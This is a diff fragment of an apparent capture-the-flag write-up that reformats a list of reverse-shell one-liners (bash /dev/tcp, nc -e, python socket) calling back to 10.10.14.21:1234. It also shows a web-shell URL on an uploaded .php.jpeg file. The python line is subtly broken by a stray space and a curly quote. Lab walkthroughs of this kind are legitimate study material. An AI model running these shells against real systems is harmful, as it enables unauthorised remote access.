@@ -65,11 +65,11 @@ view-source:http://10.10.10.146/uploads/10_10_14_21.php.jpeg?cmd=nc -e /bin/bash
 
 Try..
 
-A)bash -i >& /dev/tcp/10.10.14.21/1234 0>&1
+**A)** bash -i >& /dev/tcp/10.10.14.21/1234 0>&1
 
-B) nc -e /bin/sh 10.10.14.21 1234  DONE
+**B)** nc -e /bin/sh 10.10.14.21 1234  DONE
 
-C) python -c 'import soc ket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.21",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);’
+**C)** python -c 'import soc ket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.21",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);’
 
 
   After enumerating home directory of user guly we see that a php script is running as a cronjob which could be used to gain shell as that user. Lets look at code check_attack.php.  
